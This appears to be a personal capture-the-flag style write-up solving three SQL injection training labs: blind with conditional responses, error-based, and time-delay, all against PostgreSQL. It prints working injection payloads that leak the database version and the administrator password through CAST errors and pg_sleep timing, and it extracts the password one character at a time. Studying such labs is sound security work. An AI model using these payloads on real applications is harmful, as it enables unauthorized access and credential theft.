```
author: 0xUu
date: July 7th, 2024
topic: Blind SQLi
```


# Lab: Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Solution

the script is found on `blind1.py`


# Lab: Visible error-based SQL injection

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.

## Solution

1. Figure the type of db we're dealing with

```
KTfYtcR96JX6ia1u' || CAST((SELECT version()) as int)--
```

-> It's a PostgreSQL database

Now, the idea is to trigger an error whenever you run a query, you can do that using
concatenation with CAST(... as int). Note that we're met with character limit in our query.

Knowing that user 'administrator' exists in the first row of users table (simple select with limit 1) confirms that.

We can retrieve the password using

```
' || CAST((SELECT password FROM users LIMIT 1) as int)--
```

password in this case is: `jt5igk104tmx6sucbl86`


# Lab: Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Solution

1. Determine the type of the db

```
Qdsgj7juZVDHmmYv'; SELECT pg_sleep(10)--
```

-> It's a PostgreSQL database

2. Check if 'administrator' exists

```
{TRACKING_COOKIE}'; SELECT CASE WHEN (COUNT(username) > 0) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

-> Indeed we have a user with username='administrator' (COUNT returns int)

3. Figuring the length of the password

```
{TRACKING_COOKIE}'; SELECT CASE WHEN (LENGTH(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

-> the length is: 20 characters

4. Figuring out the actual password

```
{TRACKING_COOKIE}'; SELECT CASE WHEN (SUBSTRING(password, {i+1}, 1) = '{letter}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

Note: the latter was just a test case, we'll use python to do this, cuz attacks are throttled in burpsuite community edition
(I AM BROKE)

-> The script is found at `blind4.py`
